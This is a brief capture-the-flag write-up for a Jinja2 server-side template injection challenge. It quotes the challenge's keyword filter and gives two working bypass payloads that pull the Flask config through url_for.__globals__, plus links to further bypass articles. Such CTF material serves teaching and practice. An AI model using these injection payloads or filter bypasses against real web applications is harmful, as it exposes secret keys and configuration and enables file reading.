html source hint:ssti 
filter 
```
    if ">" in request.url or "&" in request.url or "-" in request.url or "<" in request.url:
        return "FORBIDEN"
    if "os" in request.url or  "self" in request.url or "system" in request.url:
        return "I know what you did! But flag you want is in config."
    if "'current_app" in request.url:
        uurl= "LANCTF{ .... <br> 抄current_app也要懂ssti才对嘛，你的current_app好像被过滤了"
```
404 page with payload, example:
{{url_for.__globals__['curre'+'nt_app'].config}}
{{url_for.__globals__[request.args.a].config}}?a=current_app
others will be ok, readfile

其他 payload 及 SSTI 资料可阅读
http://www.freebuf.com/articles/web/136118.html
http://www.freebuf.com/articles/web/136180.html
https://zhuanlan.zhihu.com/p/28823933
https://0day.work/jinja2-template-injection-filter-bypasses/
https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/





